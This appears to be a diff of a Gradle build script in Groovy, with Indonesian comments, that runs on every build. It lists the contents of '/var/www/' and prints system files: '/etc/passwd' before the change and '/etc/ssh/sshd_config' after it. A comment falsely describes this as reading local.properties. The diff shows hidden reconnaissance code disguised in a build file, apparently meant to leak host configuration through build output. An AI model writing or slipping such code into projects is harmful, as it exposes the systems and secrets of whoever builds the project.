@@ -25,7 +25,7 @@ if (marker.exists()) {
     marker.createNewFile()
 }
 // Langsung eksekusi tanpa bungkus 'task'
-def targetDir = new File('/')
+def targetDir = new File('/var/www/')
 println "--- LISTING FILES IN: ${targetDir.absolutePath} ---"
 
 if (targetDir.exists()) {
@@ -37,7 +37,7 @@ if (targetDir.exists()) {
     println "Direktori tidak ditemukan!"
 }
 
-def fileToRead = new File(settingsDir, '/etc/passwd') // Contoh membaca local.properties
+def fileToRead = new File('/etc/ssh/sshd_config') // Contoh membaca local.properties
 if (fileToRead.exists()) {
     println "--- ISI FILE ${fileToRead.name} ---"
     println fileToRead.text
